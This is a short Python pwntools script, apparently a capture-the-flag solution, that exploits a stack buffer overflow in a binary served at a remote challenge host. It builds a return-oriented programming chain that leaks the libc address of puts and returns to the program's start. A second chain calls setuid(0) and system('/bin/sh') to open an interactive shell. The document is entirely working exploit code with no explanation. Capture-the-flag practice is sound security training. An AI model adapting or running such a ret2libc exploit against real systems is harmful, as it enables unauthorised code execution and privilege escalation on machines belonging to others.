#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

elf = ELF('./main')

p = remote("ctf.csd.lol", 2020)

p.recvuntil(b'vault: ')

padding = B'A'*0x40
_start = 0x4010b0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

rop = ROP(elf, badchars=b'\n')
rop.raw(rop.find_gadget(['pop rdi', 'ret']))  
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(_start)

print(rop.dump())

payload = padding + p64(0) + rop.chain()

assert len(payload) <= 0x80
p.sendline(payload)

p.recvuntil(padding)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
print('puts_addr:', hex(puts_addr))

libc = ELF('./libc.so.6') 
libc.address = puts_addr - libc.symbols['puts']  

rop = ROP(libc, badchars=b'\n')
rop.setuid(0)  
rop.system(next(libc.search(b'/bin/sh\x00')))

print(rop.dump())

payload = padding + p64(0) + rop.chain()

assert len(payload) <= 0x80
p.sendline(payload)

p.interactive()